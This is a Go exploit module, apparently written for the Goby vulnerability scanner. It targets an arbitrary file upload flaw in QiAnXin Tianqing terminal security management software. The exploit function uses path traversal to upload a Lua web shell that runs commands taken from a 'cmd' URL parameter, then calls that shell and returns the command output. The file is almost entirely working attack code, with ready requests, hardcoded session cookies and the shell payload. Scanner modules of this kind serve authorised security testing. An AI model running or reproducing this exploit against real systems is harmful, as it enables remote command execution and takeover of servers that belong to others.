package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
  "Name": "QiAnXin Tianqing terminal security management system client_upload_file.json getshell",
  "Description": "There is an arbitrary file upload vulnerability in QiAnXin Tianqing terminal security management system, and the attacker can upload his own webshell to control the server.",
  "Product": "360-TianQing",
  "Homepage": "https://www.qianxin.com/product/detail/pid/49",
  "DisclosureDate": "2021-04-09",
  "Author": "itardc@163.com",
  "FofaQuery": "app=\"360-TianQing\"",
  "GobyQuery": "app=\"360-TianQing\"",
  "Level": "3",
  "Impact": "",
  "Recommendation": "",
  "References": [
    "http://fofa.so"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "cmd",
      "type": "input",
      "value": "whoami"
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "data": "",
        "data_type": "text",
        "follow_redirect": true,
        "method": "GET",
        "uri": "/"
      },
      "ResponseTest": {
        "checks": [
          {
            "bz": "",
            "operation": "==",
            "type": "item",
            "value": "200",
            "variable": "$code"
          }
        ],
        "operation": "AND",
        "type": "group"
      }
    }
  ],
  "ExploitSteps": null,
  "Tags": ["getshell"],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": ["360-TianQing"],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randomFilename := goutils.RandomHexString(4)
			cfg := httpclient.NewPostRequestConfig(fmt.Sprintf("/api/client_upload_file.json?mid=202cb962ac59075b964b07152d234b10&md5=3cb95cfbe1035bce8c448fcaf80fe7d9&filename=../../lua/%s.LUAC", randomFilename))
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Referer", u.FixedHostInfo)
			cfg.Header.Store("Cookie", "SKYLARe6721bd9ccd89f1a7ee7d79d35=71jm0o74c4k934fqechjeau0f7; YII_CSRF_TOKEN=74eae12048c53a096d8053873d9462ad07f1c51cs%3A40%3A%228a2d2746bb28b7bb46f038160b5e2c6d5b095d64%22%3B")
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryLx7ATxHThfk91oxQ")
			cfg.Data = "------WebKitFormBoundaryLx7ATxHThfk91oxQ\r\n"
			cfg.Data += "Content-Disposition: form-data; name=\"file\"; filename=\"flash.php\"\r\n"
			cfg.Data += "Content-Type: application/xxxx\r\n\r\n"
			cfg.Data += "hello,world\r\n"
			cfg.Data += "------WebKitFormBoundaryLx7ATxHThfk91oxQ--"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && resp.StatusCode == 200 {
				return strings.Contains(resp.Utf8Html, "\"status\":true") &&
					strings.Contains(resp.Utf8Html, "upload file success")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			randomFilename := goutils.RandomHexString(4)
			cfg := httpclient.NewPostRequestConfig(fmt.Sprintf("/api/client_upload_file.json?mid=202cb962ac59075b964b07152d234b10&md5=88aca4dfc84d8abd8c2b01a572d60339&filename=../../lua/%s.LUAC", randomFilename))
			//cfg := httpclient.NewPostRequestConfig("/api/client_upload_file.json?mid=202cb962ac59075b964b07152d234b10&md5=88aca4dfc84d8abd8c2b01a572d60339&filename=../../lua/sky.LUAC")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Referer", expResult.HostInfo.FixedHostInfo)
			cfg.Header.Store("Cookie", "SKYLARe6721bd9ccd89f1a7ee7d79d35=71jm0o74c4k934fqechjeau0f7; YII_CSRF_TOKEN=74eae12048c53a096d8053873d9462ad07f1c51cs%3A40%3A%228a2d2746bb28b7bb46f038160b5e2c6d5b095d64%22%3B")
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryLx7ATxHThfk91oxQ")
			cfg.Data = "------WebKitFormBoundaryLx7ATxHThfk91oxQ\r\n"
			cfg.Data += "Content-Disposition: form-data; name=\"file\"; filename=\"flash.php\"\r\n"
			cfg.Data += "Content-Type: application/xxxx\r\n\r\n"
			cfg.Data += "if ngx.req.get_uri_args().cmd then\r\n"
			cfg.Data += "cmd = ngx.req.get_uri_args().cmd\r\n"
			cfg.Data += "local t = io.popen(cmd)\r\n"
			cfg.Data += "local a = t:read(\"*all\")\r\n"
			cfg.Data += "ngx.say(a)\r\n"
			cfg.Data += "end\r\n"
			cfg.Data += "------WebKitFormBoundaryLx7ATxHThfk91oxQ--"
			httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			cmd := ss.Params["cmd"].(string)
			if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + fmt.Sprintf("/api/%s.json?cmd=%s", randomFilename, cmd)); err == nil && resp.StatusCode == 200 {
				expResult.Success = true
				expResult.Output = resp.Utf8Html
			}
			return expResult
		},
	))
}
